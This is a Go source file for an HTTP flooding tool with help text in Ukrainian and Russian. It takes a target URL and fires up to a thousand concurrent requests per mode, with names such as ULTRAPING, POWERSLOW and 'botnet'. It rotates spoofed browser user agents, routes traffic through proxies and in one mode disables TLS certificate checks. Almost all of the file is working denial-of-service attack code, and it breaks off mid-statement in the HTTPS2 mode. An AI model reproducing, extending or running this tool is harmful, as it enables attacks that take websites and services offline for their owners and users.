package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
	"crypto/tls"
	"flag"
	"math/rand"
)

const (
	MAX_REQUESTS_PER_PROCESS = 1000
)

var (
	start_time          time.Time
	cache               map[string]int
	client              *http.Client
	urlString           string
	method              string
	data                []byte
	timeout             time.Duration
	allow_redirects     bool
	proxies             string
	max_requests_global int
    userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/54.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
}
)

func init() {
	flag.StringVar(&urlString, "u", "", "url")
	flag.StringVar(&method, "m", "GET PUT DELETE PATCH POST SLOW LOW HTTPS POWERSLOW  ULTRAPOWERSLOW ULTRAHTTPS ULTRAPING HTTPS2  ANTIDDOS далі йдуть боти (BOTDDOS ANTIDDOSBOT SUPERBOT SLOWLORISBOT SUPERULTIMATEBOT) Дальше ботнети (BOTNET_V2 BOTNET_V1 BOTNET_V4 BOTNET_V6 ) Програму зробив @zemondza ", "method")
	flag.StringVar(&proxies, "p", "", "proxies")
	flag.DurationVar(&timeout, "t", 5*time.Second, "timeout")
	flag.BoolVar(&allow_redirects, "r", false, "allow redirects")
	flag.IntVar(&max_requests_global, "n", MAX_REQUESTS_PER_PROCESS, "maximum requests per process")
	flag.Parse()
	if urlString == "" {
		log.Fatalln("Error: url required")
	}
	cache = make(map[string]int)
	client = &http.Client{}
	start_time = time.Now()
}


func main() {
	var wg sync.WaitGroup
	var mutex = &sync.Mutex{}

	switch method {
	case "GET":
		for i := 0; i < max_requests_global; i++ {
			wg.Add(1)

			go func(i int) {
				defer wg.Done()

				key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
				mutex.Lock()
				if cache[key] >= max_requests_global {
					mutex.Unlock()
					return
				}
				cache[key]++
				mutex.Unlock()

				req, err := http.NewRequest(method, urlString, nil)
				if err != nil {
					log.Fatalln(err)
				}
				if proxies != "" {
					proxyURL, err := url.ParseRequestURI(proxies)
					if err != nil {
						log.Fatalln(err)
					}
					transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
					client.Transport = transport
				}
				if !allow_redirects {
					client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					}
				}
				req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				}

			}(i)
		}
	case "POST":
		data = []byte(`{"foo":"bar"}`)
		for i := 0; i < max_requests_global; i++ {
			wg.Add(1)

			go func(i int) {
				defer wg.Done()

				key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
				mutex.Lock()
				if cache[key] >= max_requests_global {
					mutex.Unlock()
					return
				}
				cache[key]++
				mutex.Unlock()

				req, err := http.NewRequest(method, urlString, bytes.NewBuffer(data))
				if err != nil {
					log.Fatalln(err)
				}
				req.Header.Set("Content-Type", "application/json")
				if proxies != "" {
					proxyURL, err := url.ParseRequestURI(proxies)
					if err != nil {
						log.Fatalln(err)
					}
					transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
					client.Transport = transport
				}
				req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				}
			}(i)
		}
	case "PUT":
		data = []byte(`{"foo":"bar"}`)
		for i := 0; i < max_requests_global; i++ {
			wg.Add(1)

			go func(i int) {
				defer wg.Done()

				key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
				mutex.Lock()
				if cache[key] >= max_requests_global {
					mutex.Unlock()
					return
				}
				cache[key]++
				mutex.Unlock()

				req, err := http.NewRequest(method, urlString, bytes.NewBuffer(data))
				if err != nil {
					log.Fatalln(err)
				}
				req.Header.Set("Content-Type", "application/json")
				if proxies != "" {
					proxyURL, err := url.ParseRequestURI(proxies)
					if err != nil {
						log.Fatalln(err)
					}
					transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
					client.Transport = transport
				}
				req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				}
			}(i)
		}
	case "DELETE":
		for i := 0; i < max_requests_global; i++ {
			wg.Add(1)

			go func(i int) {
				defer wg.Done()

				key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
				mutex.Lock()
				if cache[key] >= max_requests_global {
					mutex.Unlock()
					return
				}
				cache[key]++
				mutex.Unlock()

				req, err := http.NewRequest(method, urlString, nil)
				if err != nil {
					log.Fatalln(err)
				}
				if proxies != "" {
					proxyURL, err := url.ParseRequestURI(proxies)
					if err != nil {
						log.Fatalln(err)
					}
					transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
					client.Transport = transport
				}
				req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				}
			}(i)
		}
	case "PATCH":
		data = []byte(`{"foo":"bar"}`)
		for i := 0; i < max_requests_global; i++ {
			wg.Add(1)

			go func(i int) {
				defer wg.Done()

				key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
				mutex.Lock()
				if cache[key] >= max_requests_global {
					mutex.Unlock()
					return
				}
				cache[key]++
				mutex.Unlock()

				req, err := http.NewRequest(method, urlString, bytes.NewBuffer(data))
				if err != nil {
					log.Fatalln(err)
				}
				req.Header.Set("Content-Type", "application/json")
				if proxies != "" {
					proxyURL, err := url.ParseRequestURI(proxies)
					if err != nil {
						log.Fatalln(err)
					}
					transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
					client.Transport = transport
				}
				req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				}

			}(i)
		}
	case "SLOW":
	for i := 0; i < max_requests_global; i++ {
        wg.Add(1)
        go func(i int) {
            defer wg.Done()

            key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "SLOW")
            mutex.Lock()
            if cache[key] >= max_requests_global {
                mutex.Unlock()
                return
            }
            cache[key]++
            mutex.Unlock()

            req, err := http.NewRequest(method, urlString, nil)
            if err != nil {
                log.Fatalln(err)
            }
            if proxies != "" {
                proxyURL, err := url.ParseRequestURI(proxies)
                if err != nil {
                    log.Fatalln(err)
                }
                transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
                client.Transport = transport
            }
            if !allow_redirects {
                client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
                    return http.ErrUseLastResponse
                }
            }
            start := time.Now()
            resp, err := client.Do(req)
            if err != nil {
                log.Printf("Error: %v", err)
            } else {
                defer resp.Body.Close()
                elapsed := time.Since(start)
                fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
            }
			time.Sleep(time.Second * 10) // затримка на 10 секунд

        }(i)
    }
case "LOW":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "LOW")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
case "HTTPS":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "HTTPS")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
            req.URL.Scheme = "https" // це додаємо для запиту https 
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	case "POWERSLOW":
  for i := 0; i < max_requests_global; i++ {
    wg.Add(1)

    go func(i int) {
      defer wg.Done()

      key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "POWERSLOW")
      mutex.Lock()
      if cache[key] >= max_requests_global {
        mutex.Unlock()
        return
      }
      cache[key]++
      mutex.Unlock()

      req, err := http.NewRequest(method, urlString, nil)
      if err != nil {
        log.Fatalln(err)
      }
      if proxies != "" {
        proxyURL, err := url.ParseRequestURI(proxies)
        if err != nil {
          log.Fatalln(err)
        }
        transport := &http.Transport{
          Proxy:           http.ProxyURL(proxyURL),
          TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client.Transport = transport
      } else {
        transport := &http.Transport{
          TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client.Transport = transport
      }

      if !allow_redirects {
        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
          return http.ErrUseLastResponse
        }
      }

      req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
      start := time.Now()
      resp, err := client.Do(req)
      if err != nil {
        log.Printf("Error: %v", err)
      } else {
        defer resp.Body.Close()
        elapsed := time.Since(start)
        fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
      }
      time.Sleep(time.Second * 30) // затримка на 30 секунд
    }(i)
  }
	case "ULTRAPOWERSLOW":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPOWERSLOW")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
			time.Sleep(time.Second * 60) // затримка на 1 хвилину

		}(i)
	}
case "ULTRAHTTPS":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAHTTPS")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			req.URL.Scheme = "https"
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
			time.Sleep(time.Millisecond * 100) // затримка на 100 мілісекунд
			req2, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req2.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			req2.URL.Scheme = "https"
			start2 := time.Now()
			resp2, err := client.Do(req2)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp2.Body.Close()
				elapsed2 := time.Since(start2)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp2.Status, elapsed2)
			}
		}(i)
	}
	case "ULTRAPING":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPING")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	time.Sleep(time.Second * 1) // затримка на 1 секунду
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPING")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	time.Sleep(time.Second * 1) // затримка на 1 секунду
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPING")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	time.Sleep(time.Second * 1) // затримка на 1 секунду
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPING")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	time.Sleep(time.Second * 1) // затримка на 1 секунду
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPING")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	time.Sleep(time.Second * 1) // затримка на 1 секунду
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPING")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}(i)
	}
	case "HTTPS2":
    // збільшуємо кількість запитів за один раз
    requestBatchSize := 10
	for i := 0; i < max_requests_global; i += requestBatchSize {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "HTTPS")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key] += requestBatchSize
			mutex.Unlock()

			for j := i; j < i+requestBatchSize; j++ {
				req, err := http.NewRequest(method, urlString, nil)
				if err != nil {
					log.Fatalln(err)
				}
				if proxies != "" {
					proxyURL, err := url.ParseRequestURI(proxies)
					if err != nil {
						log.Fatalln(err)
					}
					transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
					client.Transport = transport
				}
				if !allow_redirects {
